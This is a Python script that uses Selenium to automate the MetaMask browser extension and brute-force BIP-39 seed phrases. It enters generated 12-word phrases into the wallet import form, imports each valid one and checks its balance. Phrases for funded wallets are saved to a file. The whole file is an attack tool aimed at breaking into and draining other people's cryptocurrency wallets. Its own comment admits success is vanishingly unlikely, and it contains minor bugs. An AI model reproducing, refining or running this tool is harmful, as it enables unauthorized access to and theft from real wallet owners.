'''
    @author: Victor Rayan
             e-mail:victorrayansozaramos@gmail.com
'''

import os
import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from seedPhraseGen import GenPhrase


def LoadBrowser():
    executable_path = "/home/rayan/Documents/bip-39_atk_metamask/python/chromedrive"
    os.environ["webdriver.chrome.driver"] = executable_path

    chrome_options = Options()
    chrome_options.add_extension('/home/rayan/Downloads/nkbihfbeogaeaoehlefnkodbefgpgknn-10.12.4-www.Crx4Chrome.com.crx')

    driver = webdriver.Chrome(executable_path=executable_path, chrome_options=chrome_options)
    driver.get("chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#initialize/create-password/import-with-seed-phrase")
    return driver
    
    
REQUIRED_ATTEMPS = 1000 #how many attemps you want?
ls_values=[None]*12 #initilize list that will contains the seed phrase
password='testhack123'
average_waiting_time=0.5 #this will be use in most of 'time.sleep()' method as time parameter 
                         #to give enough time to load the page and do webscraping correctly

def WordsInjection(driver, ls_values):
    
    
    
    #First, clean all the input fiels to do a new attemp with other sequence (phrase)
    ind_j=0
    for item in ls_values:
        element=driver.find_element_by_id("import-srp__srp-word-"+str(ind_j))
        element.send_keys(Keys.CONTROL + 'a', Keys.DELETE)
        ind_j=ind_j+1
        
    #do a new attemp
    index=0
    for item in ls_values:
        element=driver.find_element_by_id("import-srp__srp-word-"+str(index))
        print(item)
        element.send_keys(item)
        index=index+1
        status_for = index
        
def checkBalance(driver, ls_values):
    buttonX = driver.find_element_by_css_selector('.popover-wrap')
    time.sleep(average_waiting_time*2)
    buttonX.click()
    
    balance_element = driver.find_element_by_css_selector('#app-content > div > div.main-container-wrapper > div > div > div > div.home__balance-wrapper > div > div.wallet-overview__balance > div > div > div > div.eth-overview__primary-container > div > span.currency-display-component__text')
    balance = balance_element.text
    
    
    if(balance==0 or balance=='0'):
        print('Without Balance')
    else:
        #THIS BLOCK OF CODE HAS NEVER BEEN EXECUTED.
        #THEIR EXECUTION PROBABILTY IS OF ONE INTO (2048^12 - Ethereum Users) --> chance of access related a token or ether.
        print('ALERT!!!! THIS WALLET HAS BALANCE!!!')
        print(ls_values)
        
        #if the file that will alocates the wallets with balance doesn't exist, this will be created.
        #after it, will be added the access of wallet with balance (ethers or tokens automatically loaded)
        try:
            file = open('WALLETS_WITH_BALANCE.txt', 'a')
            file.write('BALANCE: '+str(balance))
            file.write(ls_values)
            file.write("\n\n---------------------------------")
            file.close()
        except:
            file_create = open('WALLETS_WITH_BALANCE.txt', 'w')
            file_create.write('')
            file_create.close()
            
            file = open('WALLETS_WITH_BALANCE.txt', 'a')
            file.write('BALANCE: '+str(balance)+" ETHERS")
            file.write(ls_values)
            file.write("\n\n---------------------------------")
            file.close()
    
#Verify if sequence used is valid, then continue
def VerifyPhrase(driver):
    try: 
        driver.find_element_by_xpath(" //*[ text()='Invalid Secret Recovery Phrase' ]")
        #print("\nInvalid phrase")
    except: 
        #print("\nValid phrase")
        #print(ls_values)
        ls_values_valid=[None]*len(ls_values)
        index_i = 0
        for item in ls_values:
            ls_values_valid[index_i] = item
            index_i = index_i+1
    
    
    
        inputPass1 = driver.find_element_by_id("password")
        inputPass2 = driver.find_element_by_id("confirm-password")
        acceptTerms = driver.find_element_by_xpath('//*[@id="create-new-vault__terms-checkbox"]')
        
        inputPass1.send_keys(password)
        inputPass2.send_keys(password)
        acceptTerms.click()
        time.sleep(average_waiting_time)
        buttonImport = driver.find_element_by_xpath('//*[@id="app-content"]/div/div[2]/div/div/div[2]/form/button')
        buttonImport.click()
        
        time.sleep(average_waiting_time*10)
    
        buttonAllDone = driver.find_element_by_css_selector("#app-content > div > div.main-container-wrapper > div > div > button")
        buttonAllDone.click()
        
        checkBalance(driver, ls_values)
    

df_index=0

def doBruteForce(REQUIRED_ATTEMPS):

    for x in range(REQUIRED_ATTEMPS):
        try:
            driver = LoadBrowser()
        except:
            driver = LoadBrowser()
        ls_values = GenPhrase(x)


        #####
        '''
        IF YOUT WANT TO CONTINUE SINCE LAST STEP OF ANOTHER EXECUTION 
        SEE THE FILE  'brute_force_last_step.txt' AND USE THIS METHOD BELOW
        CHANGING 'brute_force_last_step_VALUE' PARAMETER TO VALUE ENCOUNTERED
        IN THIS FILE.

        YOUR CAN ALSO WRITE A CODE / SCRIPT HERE TO DO IT AUTOMATICALLY, BUT FOLLOWING
        THE COPYRIGHT AND COPYLEFT LICENSE RULES TO SAY WHAT WAS MADE BY YOU AND 
        WHAT WAS NOT.


        ls_values = GenPhrase(brute_force_last_step_VALUE + x)
        
        '''
        #####


        time.sleep(0.5)
        WordsInjection(driver, ls_values)
        VerifyPhrase(driver), ls_values
        driver.quit()
        
        #Save the last step in case you want to try again on other mmment where you has stopped
        file_status = open('brute_force_last_step.txt', 'w')
        file_status.write(str(x))
            
doBruteForce(1000)
